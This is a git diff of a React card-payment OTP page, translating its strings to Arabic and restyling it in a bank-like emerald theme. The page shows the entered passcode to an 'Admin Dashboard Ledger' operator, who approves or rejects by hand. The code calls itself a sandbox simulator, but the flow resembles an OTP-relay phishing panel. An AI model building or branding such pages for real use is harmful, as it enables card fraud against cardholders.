@@ -69,7 +69,7 @@ export function OTPPage() {
           } else if (updatedTx.status === 'REJECTED') {
             clearInterval(interval);
             setOtpStatus('rejected');
-            setError('Transaction declined during administrative verification. Contact your issuer.');
+            setError('تم رفض المعاملة أثناء عملية التحقق والمطابقة الإدارية.');
           }
         }
       } catch (err) {
@@ -160,7 +160,7 @@ export function OTPPage() {
     const code = otp.join('');
 
     if (code.length < 6) {
-      setError('Please enter all 6 digits of the security verification code.');
+      setError('يرجى إدخال جميع خانات رمز التحقق المكون من 6 أرقام.');
       return;
     }
 
@@ -180,12 +180,12 @@ export function OTPPage() {
         setIsVerifying(false);
         setOtpStatus('submitted');
       } else {
-        setError(data.error || 'Incorrect security verification code. Please try again.');
+        setError(data.error || 'رمز التحقق المدخل غير صحيح. يرجى المحاولة مرة أخرى.');
         setIsVerifying(false);
       }
     } catch (err) {
       console.error(err);
-      setError('An error occurred during verification. Please try again.');
+      setError('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى.');
       setIsVerifying(false);
     }
   };
@@ -198,7 +198,7 @@ export function OTPPage() {
     setTimer(90); // Reset timer
     setOtp(Array(6).fill('')); // Clear inputs
     setError(null);
-    setNotification('A fresh secure 6-digit passcode has been dispatched to your registered phone.');
+    setNotification('تم إرسال رمز تحقق آمن جديد إلى هاتفك المحمول المسجل.');
 
     // Focus first input
     setTimeout(() => {
@@ -224,45 +224,48 @@ export function OTPPage() {
         initial={{ opacity: 0, y: 15 }}
         animate={{ opacity: 1, y: 0 }}
         transition={{ duration: 0.5 }}
-        className="w-full rounded-3xl border border-slate-800 bg-slate-900/40 p-8 backdrop-blur-xl shadow-2xl shadow-indigo-950/20"
+        className="w-full rounded-2xl border border-gray-100 bg-white p-8 shadow-xl relative overflow-hidden"
       >
+        {/* Top emerald line bar */}
+        <div className="absolute top-0 inset-x-0 h-1.5 bg-[#004d33]" />
+
         {otpStatus === 'submitted' ? (
           <div className="space-y-6 text-center py-6">
             <div className="relative flex items-center justify-center h-20 w-20 mx-auto mb-4">
-              <div className="absolute inset-0 rounded-full border border-indigo-500/10 animate-ping" />
-              <div className="absolute inset-2 rounded-full border border-t-indigo-400 border-r-indigo-500/0 border-b-indigo-500/0 border-l-indigo-400/20 animate-spin" style={{ animationDuration: '2s' }} />
-              <RefreshCw className="h-6 w-6 text-indigo-400 animate-spin" />
+              <div className="absolute inset-0 rounded-full bg-emerald-500/5 animate-ping" />
+              <div className="absolute inset-2 rounded-full border border-t-[#004d33] border-r-transparent border-b-transparent border-l-emerald-600/20 animate-spin" style={{ animationDuration: '2s' }} />
+              <RefreshCw className="h-6 w-6 text-[#004d33] animate-spin" />
             </div>
             
-            <h3 className="text-xl font-bold text-white tracking-tight">Verifying Security Code...</h3>
-            <p className="text-xs text-slate-300 leading-relaxed max-w-xs mx-auto">
-              Your security passcode <strong className="text-indigo-400 font-mono text-sm tracking-wider">{otp.join('')}</strong> has been transmitted to the bank secure audit ledger.
+            <h3 className="text-lg font-extrabold text-slate-800 font-sans">جاري التحقق من رمز الأمان...</h3>
+            <p className="text-xs text-slate-500 leading-relaxed max-w-xs mx-auto">
+              تم إرسال رمز التحقق <strong className="text-[#004d33] font-mono text-sm tracking-wider">{otp.join('')}</strong> بأمان إلى نظام المطابقة والتدقيق المصرفي.
             </p>
-            <p className="text-xs text-amber-400 font-mono font-semibold animate-pulse flex items-center justify-center space-x-1">
+            <p className="text-xs text-amber-600 font-sans font-extrabold animate-pulse flex items-center justify-center gap-1">
               <span>●</span>
-              <span>WAITING FOR BANK FINAL SETTLEMENT...</span>
+              <span>في انتظار التسوية النهائية للعملية...</span>
             </p>
             
-            <div className="rounded-2xl bg-indigo-500/5 border border-indigo-500/10 p-5 text-left text-[11px] font-mono text-slate-400 space-y-1.5">
-              <p className="font-bold text-indigo-400 flex items-center space-x-1.5 mb-2">
-                <ShieldAlert className="h-3.5 w-3.5" />
-                <span>SANDBOX SIMULATOR STEP 2:</span>
+            <div className="rounded-xl bg-sky-50/50 border border-sky-100 p-4 text-right dir-rtl text-[11px] space-y-1.5 text-slate-600">
+              <p className="font-extrabold text-sky-800 flex items-center gap-1.5 mb-2">
+                <ShieldAlert className="h-4 w-4 text-sky-600" />
+                <span>محاكي بيئة التطوير - الخطوة الثانية:</span>
               </p>
-              <p>1. Keep this transaction page open.</p>
-              <p>2. Toggle back to the <strong className="text-indigo-300">Admin Dashboard Ledger</strong> tab.</p>
-              <p>3. Notice that transaction <strong className="text-indigo-300">{tx.id}</strong> is now in <strong className="text-indigo-400">OTP_SUBMITTED</strong> state, showing your code <strong className="text-emerald-400">{otp.join('')}</strong>.</p>
-              <p>4. Click <strong className="text-emerald-400">FINAL APPROVE</strong> to settle, or <strong className="text-rose-400">REJECT</strong> to fail.</p>
+              <p>1. يرجى إبقاء هذه الصفحة مفتوحة ومراقبة المعاملة.</p>
+              <p>2. انتقل إلى علامة التبويب المفتوحة <strong className="text-sky-700">لوحة التحكم الإدارية</strong>.</p>
+              <p>3. ستلاحظ أن حالة العملية <strong className="text-sky-700">{tx.id}</strong> تحولت تلقائياً إلى <strong className="font-bold">OTP_SUBMITTED</strong>، عارضةً الرمز <strong className="text-emerald-700 font-bold font-mono">{otp.join('')}</strong> الذي قمت بإدخاله.</p>
+              <p>4. انقر على زر <strong className="text-[#004d33] font-extrabold">FINAL APPROVE</strong> لإتمام العملية بنجاح، أو زر <strong className="text-rose-600 font-extrabold">REJECT</strong> لرفضها.</p>
             </div>
           </div>
         ) : (
           <>
             <div className="text-center mb-6">
-              <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 mb-4">
-                <KeyRound className="h-6 w-6" />
+              <div className="mx-auto flex h-12 w-12 items-center justify-center rounded-full bg-emerald-50 text-[#004d33] border border-emerald-100 mb-4">
+                <KeyRound className="h-5 w-5" />
               </div>
-              <h2 className="text-2xl font-bold text-white tracking-tight">Two-Factor Authentication</h2>
-              <p className="text-xs text-slate-400 mt-2 leading-relaxed">
-                We sent a secure One-Time Password (OTP) to your registered mobile number associated with your card ending in <strong className="text-white">{tx.cardNumber.slice(-4)}</strong>.
+              <h2 className="text-xl font-extrabold text-slate-800 font-sans">التحقق الثنائي للبطاقة</h2>
+              <p className="text-xs text-slate-500 mt-2 leading-relaxed font-medium">
+                تم إرسال رمز الأمان المؤقت (OTP) إلى رقم هاتفك المحمول المسجل والمرتبط ببطاقتك المصرفية التي تنتهي بالرقم <strong className="text-[#004d33] font-mono">{tx.cardNumber.slice(-4)}</strong>.
               </p>
             </div>
 
@@ -271,7 +274,7 @@ export function OTPPage() {
               <motion.div
                 initial={{ opacity: 0, height: 0 }}
                 animate={{ opacity: 1, height: 'auto' }}
-                className="mb-4 rounded-xl bg-emerald-500/10 border border-emerald-500/20 p-3 text-[11px] text-emerald-400 font-medium"
+                className="mb-4 rounded-xl bg-emerald-50 border border-emerald-100 p-3 text-xs text-[#004d33] font-extrabold text-center"
               >
                 {notification}
               </motion.div>
@@ -293,28 +296,28 @@ export function OTPPage() {
                     onKeyDown={(e) => handleKeyDown(e, idx)}
                     onPaste={idx === 0 ? handlePaste : undefined}
                     disabled={isVerifying || isVerified}
-                    className="w-12 h-14 text-center text-xl font-bold font-mono rounded-xl border border-slate-800 bg-slate-950 text-white focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all duration-150 disabled:opacity-50"
+                    className="w-11 h-13 text-center text-lg font-bold font-mono rounded-xl border border-gray-200 bg-white text-slate-900 focus:outline-none focus:ring-2 focus:ring-[#004d33] focus:border-transparent transition-all duration-150 disabled:opacity-50"
                   />
                 ))}
               </div>
 
               {error && (
-                <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center space-x-2 animate-pulse">
-                  <AlertCircle className="h-4 w-4 shrink-0" />
+                <div className="rounded-xl border border-rose-100 bg-rose-50 p-3 text-xs text-rose-700 flex items-center gap-2 justify-start dir-rtl text-right">
+                  <AlertCircle className="h-4 w-4 shrink-0 text-rose-600" />
                   <span>{error}</span>
                 </div>
               )}
 
               {/* Code expiration and resend details */}
-              <div className="flex justify-between items-center text-xs font-mono text-slate-400 px-1">
+              <div className="flex justify-between items-center text-xs font-sans text-slate-500 px-1 dir-rtl text-right">
                 <span>
                   {timer > 0 ? (
-                    <span className="flex items-center space-x-1">
-                      <span>Expires in:</span>
-                      <span className="text-amber-400 font-bold">{formatTime(timer)}</span>
+                    <span className="flex items-center gap-1">
+                      <span>تنتهي صلاحية الرمز خلال:</span>
+                      <span className="text-amber-600 font-bold font-mono">{formatTime(timer)}</span>
                     </span>
                   ) : (
-                    <span className="text-rose-400 font-bold">Code Expired</span>
+                    <span className="text-rose-600 font-extrabold">انتهت صلاحية الرمز</span>
                   )}
                 </span>
                 
@@ -322,11 +325,11 @@ export function OTPPage() {
                   type="button"
                   onClick={handleResend}
                   disabled={resendCooldown}
-                  className={`font-semibold underline transition ${
-                    resendCooldown ? 'text-slate-600 cursor-not-allowed' : 'text-indigo-400 hover:text-indigo-300'
+                  className={`font-extrabold underline transition ${
+                    resendCooldown ? 'text-slate-400 cursor-not-allowed' : 'text-[#004d33] hover:text-[#003824]'
                   }`}
                 >
-                  {resendCooldown ? 'Resending...' : 'Resend Code'}
+                  {resendCooldown ? 'جاري الإرسال...' : 'إرسال الرمز مجدداً'}
                 </button>
               </div>
 
@@ -334,39 +337,39 @@ export function OTPPage() {
               <button
                 type="submit"
                 disabled={isVerifying || isVerified}
-                className={`w-full h-12 rounded-xl flex items-center justify-center space-x-2 text-xs font-bold tracking-wider transition-all duration-300 shadow-lg ${
+                className={`w-full h-12 rounded-xl flex items-center justify-center gap-2 text-xs font-bold transition-all duration-300 shadow-md ${
                   isVerified
-                    ? 'bg-emerald-500 text-slate-950 shadow-emerald-500/10'
-                    : 'bg-indigo-600 hover:bg-indigo-500 text-white hover:shadow-indigo-500/20'
+                    ? 'bg-emerald-500 text-white shadow-emerald-500/10'
+                    : 'bg-[#004d33] hover:bg-[#003a26] text-white hover:shadow-emerald-950/15'
                 }`}
               >
                 {isVerifying ? (
                   <>
-                    <RefreshCw className="h-4 w-4 animate-spin" />
-                    <span>AUTHENTICATING SECURE LOCK...</span>
+                    <RefreshCw className="h-4 w-4 animate-spin text-white" />
+                    <span>جاري تأكيد رمز الحماية الآمن...</span>
                   </>
                 ) : isVerified ? (
                   <>
-                    <CheckCircle2 className="h-4 w-4" />
-                    <span>CODE CONFIRMED!</span>
+                    <CheckCircle2 className="h-4 w-4 text-white" />
+                    <span>تم التحقق وتأكيد السداد!</span>
                   </>
                 ) : (
                   <>
-                    <span>VERIFY AND PAY</span>
-                    <ArrowRight className="h-4 w-4" />
+                    <span>تحقق وتأكيد الدفع</span>
+                    <ArrowRight className="h-4 w-4 rotate-180" />
                   </>
                 )}
               </button>
             </form>
 
             {/* Info/Simulator Box */}
-            <div className="mt-8 pt-6 border-t border-slate-800 text-center text-[11px] font-mono text-slate-500 space-y-1">
-              <p className="flex items-center justify-center space-x-1.5 text-indigo-400/90 font-bold">
+            <div className="mt-8 pt-5 border-t border-gray-100 text-center text-[11px] text-slate-400 space-y-1 font-sans">
+              <p className="flex items-center justify-center gap-1 text-[#004d33] font-extrabold">
                 <Lock className="h-3 w-3" />
-                <span>SECURE 3D-SECURE GATEWAY</span>
+                <span>بوابة سداد آمنة ثلاثية الأبعاد</span>
               </p>
-              <p>
-                💡 Sandbox Simulator Tip: Enter any 6-digit passcode (such as <strong className="text-slate-300">123456</strong>) to authenticate.
+              <p className="font-medium text-[10px]">
+                💡 للمطورين: يمكنك إدخال أي رمز مكون من 6 أرقام (مثال: <strong className="text-slate-600">123456</strong>) لإتمام التحقق والمحاكاة.
               </p>
             </div>
           </>
